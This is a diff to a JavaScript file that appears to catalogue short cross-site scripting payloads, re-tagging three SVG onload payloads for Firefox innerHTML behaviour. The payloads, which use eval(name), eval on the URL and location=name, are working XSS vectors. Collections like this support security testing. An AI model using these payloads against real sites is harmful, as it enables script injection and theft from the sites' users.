@@ -2,6 +2,7 @@ const TAGS = {
     chrome: 'chromium',
     firefox: 'firefox',
     safari: 'safari',
+    firefoxInner: 'firefox-innerHTML',
     unsafeInline: 'script-unsafe-inline',
     inlineStyleAllow: 'style-inline-allowed',
     inlineStyleBlock: 'style-inline-blocked',
@@ -11,7 +12,7 @@ const TAGS = {
     controlsLength: 'controls-index-of-iframe',
     controlsName: 'controls-name',
     controlsURL: 'controls-URL',
-    notInner: 'not-innerHTML'
+    notInner: 'not-innerHTML',
 }
 
 const PAYLOADS = [
@@ -57,17 +58,17 @@ const PAYLOADS = [
     },
     {
         html: "<svg/onload=eval(name)>",
-        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
         author: null,
     },
     {
         html: "<svg/onload=eval(`'`+URL)>",
-        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL, TAGS.notInner, TAGS.firefoxInner],
         author: '@wcbowling'
     },
     {
         html: "<svg/onload=location=name>",
-        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.controlsName],
+        tags: [TAGS.unsafeInline, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
         author: null
     },
     {
